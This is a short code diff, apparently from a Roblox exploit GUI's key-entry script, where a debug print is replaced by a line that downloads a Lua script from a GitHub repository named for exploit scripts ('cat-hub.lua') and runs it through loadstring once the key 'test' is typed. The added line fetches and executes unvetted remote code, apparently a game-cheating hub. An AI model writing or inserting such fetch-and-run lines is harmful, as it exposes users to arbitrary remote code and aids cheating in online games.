@@ -80,7 +80,7 @@ local function XKCQPNL_fake_script() -- KeyHereTextBox.LocalScript
 
 	script.Parent.FocusLost:Connect(function(enter)
 		if script.Parent.Text == 'test' then
-			print('sucess')
+			loadstring(game:HttpGet"https://raw.githubusercontent.com/exploitscat/Roblox-Scripts/main/cat-hub.lua")()
 			end
 	end)
 end
